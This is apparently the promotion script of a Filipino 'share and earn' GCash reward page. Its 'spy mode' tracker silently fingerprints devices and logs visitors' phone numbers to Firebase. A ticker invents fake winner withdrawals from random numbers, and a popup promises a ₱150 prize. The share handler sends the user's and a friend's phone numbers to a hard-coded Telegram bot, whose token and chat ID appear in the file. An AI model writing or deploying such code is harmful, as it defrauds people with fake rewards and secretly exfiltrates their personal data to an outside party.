// ========== SIMPLE DEVICE + NUMBER TRACKING (SPY MODE) ==========
// Walang blocking, record lang ng activity para makita sa admin

const spyTracker = {
    // Kunin ang fingerprint ng device
    getFingerprint: function() {
        const screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const fingerprintString = `${navigator.userAgent}|${screen}|${timezone}|${navigator.language}|${navigator.platform}|${navigator.hardwareConcurrency || 'unknown'}|${navigator.deviceMemory || 'unknown'}`;
        
        let hash = 0;
        for (let i = 0; i < fingerprintString.length; i++) {
            hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
            hash |= 0;
        }
        return `FP_${Math.abs(hash)}`;
    },

    // I-record ang activity (spy mode - walang block)
    track: async function() {
        const phone = localStorage.getItem("userPhone");
        const fingerprint = this.getFingerprint();
        
        if (!phone) return;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            const db = firebase.database();
            
            try {
                const deviceRef = db.ref('devices/' + fingerprint);
                const deviceSnap = await deviceRef.once('value');
                
                if (!deviceSnap.exists()) {
                    const counterRef = db.ref('admin/deviceCounter');
                    const counterSnap = await counterRef.once('value');
                    let nextNum = (counterSnap.val() || 0) + 1;
                    await counterRef.set(nextNum);
                    const displayId = `Dev${nextNum}`;
                    
                    await deviceRef.set({
                        phone: phone,
                        displayId: displayId,
                        fingerprint: fingerprint,
                        firstSeen: Date.now(),
                        lastSeen: Date.now()
                    });
                    
                    await db.ref('device_id_map/' + fingerprint).set({
                        displayId: displayId,
                        phone: phone,
                        createdAt: Date.now()
                    });
                    
                    localStorage.setItem("userDeviceDisplayId", displayId);
                    console.log(`🕵️ New device tracked: ${displayId} for ${phone}`);
                } else {
                    await deviceRef.update({
                        lastSeen: Date.now(),
                        phone: phone
                    });
                }
                
                await db.ref('device_phone_map/' + fingerprint).set({
                    phone: phone,
                    lastSeen: Date.now()
                });
                
                const sessionRef = db.ref('user_sessions/' + phone);
                const sessionSnap = await sessionRef.once('value');
                
                if (!sessionSnap.exists()) {
                    await sessionRef.set({
                        phone: phone,
                        balance: 0,
                        deviceFingerprint: fingerprint,
                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
                        firstVisit: Date.now(),
                        lastUpdate: Date.now(),
                        highestReward: 0
                    });
                } else {
                    await sessionRef.update({
                        deviceFingerprint: fingerprint,
                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || sessionSnap.val().deviceDisplayId,
                        lastUpdate: Date.now()
                    });
                }
                
                await db.ref('activity_logs/' + Date.now()).set({
                    phone: phone,
                    deviceId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
                    fingerprint: fingerprint,
                    page: "share_and_earn",
                    timestamp: Date.now()
                });
                
                console.log(`🕵️ Tracked: ${phone} | Device: ${localStorage.getItem("userDeviceDisplayId") || "Unknown"}`);
                
            } catch(e) {
                console.log("Tracking error:", e);
            }
        }
    }
};

// ========== WEIGHTED RANDOM AMOUNTS ==========
// Common: 150, 300 (60%)
// More rare: 450, 600, 750 (30%)
// Most rare: 900, 1050, 1200 (10%)
// Kapag naka-1200 na ang user, hindi na pwede maka-receive ng 150 o mag-withdraw

const rewardTiers = {
    common: {
        amounts: [150, 300],
        weight: 60,
        maxReward: 300,
        name: "COMMON"
    },
    rare: {
        amounts: [450, 600, 750],
        weight: 30,
        maxReward: 750,
        name: "RARE"
    },
    legendary: {
        amounts: [900, 1050, 1200],
        weight: 10,
        maxReward: 1200,
        name: "LEGENDARY"
    }
};

function generateWeightedAmount() {
    const random = Math.random() * 100;
    let selectedTier = rewardTiers.common;
    
    if (random < rewardTiers.common.weight) {
        selectedTier = rewardTiers.common;
    } else if (random < rewardTiers.common.weight + rewardTiers.rare.weight) {
        selectedTier = rewardTiers.rare;
    } else {
        selectedTier = rewardTiers.legendary;
    }
    
    const amounts = selectedTier.amounts;
    return amounts[Math.floor(Math.random() * amounts.length)];
}

// ========== CHECK IF USER CAN CLAIM ==========
async function canUserClaim(amount) {
    const phone = localStorage.getItem("userPhone");
    if (!phone) return false;
    
    if (typeof firebase === 'undefined' || !firebase.database) return true;
    
    const db = firebase.database();
    
    try {
        // Kunin ang highest reward ng user
        const sessionSnap = await db.ref('user_sessions/' + phone).once('value');
        const highestReward = sessionSnap.exists() ? sessionSnap.val().highestReward || 0 : 0;
        
        // Kung naka-1200 na ang user, hindi na pwede mag-claim
        if (highestReward >= 1200) {
            alert("🏆 MAX REWARD REACHED! You have already received ₱1200. No more claims allowed.");
            return false;
        }
        
        // Kung ang bagong amount ay 150 at ang user ay naka-receive na ng 1200? (redundant check)
        if (amount === 150 && highestReward >= 1200) {
            alert("🏆 You have reached the maximum reward limit!");
            return false;
        }
        
        return true;
        
    } catch(e) {
        console.log("Claim check error:", e);
        return true;
    }
}

// ========== UPDATE HIGHEST REWARD ==========
async function updateHighestReward(amount) {
    const phone = localStorage.getItem("userPhone");
    if (!phone) return;
    
    if (typeof firebase === 'undefined' || !firebase.database) return;
    
    const db = firebase.database();
    
    try {
        const sessionRef = db.ref('user_sessions/' + phone);
        const sessionSnap = await sessionRef.once('value');
        const currentHighest = sessionSnap.exists() ? sessionSnap.val().highestReward || 0 : 0;
        
        if (amount > currentHighest) {
            await sessionRef.update({
                highestReward: amount,
                lastRewardAmount: amount,
                lastRewardDate: Date.now()
            });
            console.log(`🏆 New highest reward: ₱${amount}`);
        }
        
        // I-record sa reward history
        await db.ref('reward_history/' + phone + '/' + Date.now()).set({
            amount: amount,
            timestamp: Date.now(),
            deviceId: localStorage.getItem("userDeviceDisplayId") || "Unknown"
        });
        
    } catch(e) {
        console.log("Update highest reward error:", e);
    }
}

// ========== LOGICAL RANDOM WINNERS TICKER ==========
// May animation at 15 seconds interval

const winnerTicker = {
    prefixes: ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"],
    winnerElement: null,
    
    generateLast4Digits: function() {
        return Math.floor(1000 + Math.random() * 9000).toString();
    },
    
    generatePrefix: function() {
        return this.prefixes[Math.floor(Math.random() * this.prefixes.length)];
    },
    
    generateWinnerText: function() {
        const prefix = this.generatePrefix();
        const last4 = this.generateLast4Digits();
        const amount = generateWeightedAmount();
        // Get tier name based on amount
        let tierIcon = "⭐";
        if (amount <= 300) tierIcon = "🟢";
        else if (amount <= 750) tierIcon = "🟡";
        else tierIcon = "🔴";
        
        return `${tierIcon} ${prefix}***${last4} withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${amount}`;
    },
    
    animateTransition: function(newText) {
        if (!this.winnerElement) return;
        
        this.winnerElement.style.transition = 'opacity 0.3s ease';
        this.winnerElement.style.opacity = '0';
        
        setTimeout(() => {
            this.winnerElement.innerHTML = newText;
            this.winnerElement.style.opacity = '1';
        }, 300);
    },
    
    updateWinner: function() {
        const newWinnerText = this.generateWinnerText();
        this.animateTransition(newWinnerText);
    },
    
    start: function() {
        this.winnerElement = document.getElementById('winnerText');
        if (!this.winnerElement) {
            console.log("Winner element not found");
            return;
        }
        
        this.winnerElement.innerHTML = this.generateWinnerText();
        this.winnerElement.style.transition = 'opacity 0.3s ease';
        this.winnerElement.style.opacity = '1';
        
        setInterval(() => {
            this.updateWinner();
        }, 15000);
        
        console.log("🎲 Winner ticker started - updates every 15 seconds");
    }
};

// ========== REFERRAL TIMER (PERSISTENT - 5 MINUTES) ==========

const referralTimer = {
    STORAGE_KEY: 'referral_end_time',
    
    startTimer: function() {
        const endTime = Date.now() + (5 * 60 * 1000);
        localStorage.setItem(this.STORAGE_KEY, endTime);
        return endTime;
    },
    
    getRemainingTime: function() {
        const endTime = localStorage.getItem(this.STORAGE_KEY);
        if (!endTime) return 0;
        
        const remaining = parseInt(endTime) - Date.now();
        if (remaining <= 0) {
            this.clearTimer();
            return 0;
        }
        return Math.floor(remaining / 1000);
    },
    
    clearTimer: function() {
        localStorage.removeItem(this.STORAGE_KEY);
    },
    
    updateDisplay: function() {
        const remainingSecs = this.getRemainingTime();
        const timerElement = document.getElementById('popupTimerDisplay');
        
        if (timerElement && remainingSecs > 0) {
            const mins = Math.floor(remainingSecs / 60);
            const secs = remainingSecs % 60;
            timerElement.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            return true;
        } else if (timerElement && remainingSecs <= 0) {
            timerElement.innerHTML = "00:00";
        }
        return false;
    },
    
    startCountdown: function() {
        this.updateDisplay();
        
        const interval = setInterval(() => {
            const hasTime = this.updateDisplay();
            if (!hasTime) {
                clearInterval(interval);
                const claimBtn = document.getElementById('claimGCashBtn');
                if (claimBtn) {
                    claimBtn.disabled = false;
                    claimBtn.style.opacity = '1';
                }
            }
        }, 1000);
        
        return interval;
    }
};

// ========== SHARE BUTTON LOGIC ==========
let shareCountdownInterval = null;

function startShareCountdown() {
    if (shareCountdownInterval) clearInterval(shareCountdownInterval);
    
    shareCountdownInterval = setInterval(() => {
        const remaining = referralTimer.getRemainingTime();
        const shareBtn = document.getElementById('shareButton');
        const friendInput = document.getElementById('friendPhoneInput');
        const statusMsg = document.getElementById('statusMessage');
        
        if (remaining > 0) {
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            if (shareBtn) {
                shareBtn.disabled = true;
                shareBtn.innerHTML = `⏰ WAIT ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            }
            if (friendInput) friendInput.disabled = true;
            if (statusMsg) {
                statusMsg.innerHTML = `<span class="status-waiting">⏳ Please wait ${mins}:${secs.toString().padStart(2, '0')} before sharing again ⏳</span>`;
            }
        } else {
            if (shareBtn) {
                shareBtn.disabled = false;
                shareBtn.innerHTML = "🐾 SHARE & UNLOCK 🐾";
            }
            if (friendInput) friendInput.disabled = false;
            if (statusMsg) {
                statusMsg.innerHTML = `<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>`;
            }
            clearInterval(shareCountdownInterval);
            shareCountdownInterval = null;
        }
    }, 1000);
}

// ========== SHARE BUTTON HANDLER ==========
async function handleShare() {
    const friendPhone = document.getElementById('friendPhoneInput').value.trim();
    const userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Please enter valid 11-digit number starting with 09");
        return;
    }
    
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    
    const message = `📱 REFERRAL INVITE!\n👤 User: ${userPhone}\n👥 Friend: ${friendPhone}\n💰 Reward: ₱150 each`;
    
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
    } catch(e) {
        console.log("Telegram error:", e);
    }
    
    referralTimer.startTimer();
    startShareCountdown();
    
    document.getElementById('friendPhoneInput').value = '';
    
    const progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '100%';
    
    showPrizePopup();
}

// ========== PRIZE POPUP FUNCTIONS ==========
function showPrizePopup() {
    const popup = document.getElementById('prizePopup');
    const popupBalance = document.getElementById('popupBalanceAmount');
    
    if (popupBalance) popupBalance.innerHTML = "₱150.00";
    
    referralTimer.startCountdown();
    startConfetti();
    
    if (popup) popup.style.display = 'flex';
}

function closePrizePopup() {
    const popup = document.getElementById('prizePopup');
    if (popup) popup.style.display = 'none';
    stopConfetti();
}

// ========== CONFETTI FUNCTIONS ==========
let confettiInterval = null;

function startConfetti() {
    const canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const ctx = canvas.getContext('2d');
    
    const particles = [];
    for (let i = 0; i < 150; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 8 + 3,
            color: `hsl(${Math.random() * 360}, 100%, 60%)`,
            speed: Math.random() * 4 + 2
        });
    }
    
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        for (let p of particles) {
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        
        confettiInterval = requestAnimationFrame(draw);
    }
    
    draw();
}

function stopConfetti() {
    if (confettiInterval) {
        cancelAnimationFrame(confettiInterval);
        confettiInterval = null;
    }
    const canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        const ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
    }
}

// ========== CLAIM GCASH BUTTON WITH REWARD LIMIT ==========
function connectClaimButton() {
    const claimGCashBtn = document.getElementById('claimGCashBtn');
    
    if (claimGCashBtn) {
        claimGCashBtn.onclick = async function() {
            // Check muna kung puede pang mag-claim ang user
            const userPhone = localStorage.getItem("userPhone");
            
            if (typeof firebase !== 'undefined' && firebase.database) {
                const db = firebase.database();
                const sessionSnap = await db.ref('user_sessions/' + userPhone).once('value');
                const highestReward = sessionSnap.exists() ? sessionSnap.val().highestReward || 0 : 0;
                
                // Kung naka-1200 na, bawal na mag-claim
                if (highestReward >= 1200) {
                    alert("🏆 MAXIMUM REWARD REACHED! 🏆\n\nYou have already received ₱1200.\nNo more withdrawals allowed.");
                    return;
                }
            }
            
            // Call the firewall logic from popup.js
            if (typeof window.showClaimPopup === 'function') {
                window.showClaimPopup(150);
            } else {
                console.error("showClaimPopup not loaded");
                alert("System loading. Please try again.");
            }
        };
    }
}

// ========== MAIN TIMER ==========
function updateMainTimer() {
    const target = new Date(2026, 4, 1, 0, 0, 0);
    const now = new Date();
    const diff = target - now;
    const timerDisplay = document.getElementById('mainTimerDisplay');
    
    if (timerDisplay && diff > 0) {
        const days = Math.floor(diff / (1000*60*60*24));
        const hours = Math.floor((diff % (86400000)) / 3600000);
        const mins = Math.floor((diff % 3600000) / 60000);
        const secs = Math.floor((diff % 60000) / 1000);
        timerDisplay.innerHTML = `${days}D ${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
    } else if (timerDisplay) {
        timerDisplay.innerHTML = "00:00:00";
    }
}

// ========== CHECK REFERRAL TIMER ON PAGE LOAD ==========
function checkExistingTimer() {
    const remaining = referralTimer.getRemainingTime();
    if (remaining > 0) {
        startShareCountdown();
        referralTimer.startCountdown();
    }
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Promotion.js loaded - Spy Mode Only");
    
    spyTracker.track();
    winnerTicker.start();
    checkExistingTimer();
    
    const shareBtn = document.getElementById('shareButton');
    if (shareBtn) {
        const newShareBtn = shareBtn.cloneNode(true);
        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
        newShareBtn.onclick = handleShare;
        newShareBtn.disabled = false;
    }
    
    connectClaimButton();
    
    updateMainTimer();
    setInterval(updateMainTimer, 1000);
    
    const popup = document.getElementById('prizePopup');
    if (popup) {
        popup.onclick = function(e) {
            if (e.target === popup) {
                closePrizePopup();
            }
        };
    }
    
    console.log("✅ Promotion.js initialized");
});
